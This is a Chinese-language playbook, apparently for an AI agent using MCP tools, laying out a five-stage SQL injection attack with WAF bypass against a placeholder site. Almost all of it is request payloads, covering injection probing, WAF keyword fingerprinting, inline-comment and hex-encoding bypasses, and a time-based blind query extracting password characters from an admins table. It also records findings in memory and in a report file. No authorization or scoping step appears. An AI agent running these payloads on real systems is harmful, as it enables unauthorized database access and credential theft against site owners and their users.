# SQL Injection WAF Bypass — MCP 攻防流程

> 关联技能: `web-sqli-001`
> 所需 MCP: Sequential Thinking, HTTP Fetch, Playwright, Memory, Filesystem

---

## 阶段 1: 注入点探测 (Sequential Thinking + HTTP)

**Sequential Thinking 拆解:**
```
Step 1: 确认参数是否拼接进 SQL 查询
Step 2: 判断注入类型 (数字型/字符型/盲注)
Step 3: 判断 WAF 对 SQL 关键字的拦截规则
```

**HTTP Fetch 基础探测:**
```json
[
  {"method": "GET", "url": "https://target.com/product?id=1'"},
  {"method": "GET", "url": "https://target.com/product?id=1 AND 1=1"},
  {"method": "GET", "url": "https://target.com/product?id=1 AND 1=2"},
  {"method": "GET", "url": "https://target.com/product?id=1 SLEEP(5)"}
]
```

---

## 阶段 2: WAF SQL 关键字指纹 (HTTP + Memory)

**HTTP Fetch 发送 WAF 探测 payload 序列:**
```json
[
  {"method": "GET", "url": "https://target.com/product?id=1 UNION SELECT 1,2,3"},
  {"method": "GET", "url": "https://target.com/product?id=1 UN/**/ION SEL/**/ECT 1,2,3"},
  {"method": "GET", "url": "https://target.com/product?id=1 UNION%09SELECT 1,2,3"},
  {"method": "GET", "url": "https://target.com/product?id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3"}
]
```

**Memory MCP 记录 WAF 行为:**
```json
[
  {"action": "add", "entity": "target.com", "attribute": "sqli_waf_blocks_union", "value": "true"},
  {"action": "add", "entity": "target.com", "attribute": "sqli_waf_blocks_comment", "value": "false"},
  {"action": "add", "entity": "target.com", "attribute": "sqli_waf_blocks_hex", "value": "false"}
]
```

---

## 阶段 3: 绕过与注入 (Sequential Thinking + HTTP)

基于 WAF 指纹选择绕过策略:

**策略 A: 内联注释绕过 (当 WAF 不拦截注释时)**
```json
{
  "method": "GET",
  "url": "https://target.com/product?id=1 UN/**/ION SEL/**/ECT 1,2,3 FR/**/OM users"
}
```

**策略 B: Hex 编码绕过 (当 WAF 不检测 Hex 时)**
```json
{
  "method": "GET", 
  "url": "https://target.com/product?id=1 UNION SELECT 1,2,3 FROM users WHERE id=0x31"
}
```

**策略 C: 盲注 (当 WAF 拦截所有回显注入时)**
```json
{
  "method": "GET",
  "url": "https://target.com/product?id=1 AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN SLEEP(3) ELSE 0 END FROM admins)"
}
```

---

## 阶段 4: 验证 (HTTP + Playwright)

时间盲注验证:
```json
[
  {"method": "GET", "url": "https://target.com/product?id=1 AND SLEEP(3)"},
  {"method": "GET", "url": "https://target.com/product?id=1 AND SLEEP(0)"}
]
```

---

## 阶段 5: 记录 (Memory + Filesystem)

```json
[
  {"action": "add", "entity": "target.com", "attribute": "sqli_injection_point", "value": "/product?id="},
  {"action": "add", "entity": "target.com", "attribute": "sqli_bypass_method", "value": "inline_comment"},
  {"action": "write", "path": "./results/sqli-report.md", "content": "..."}
]
```
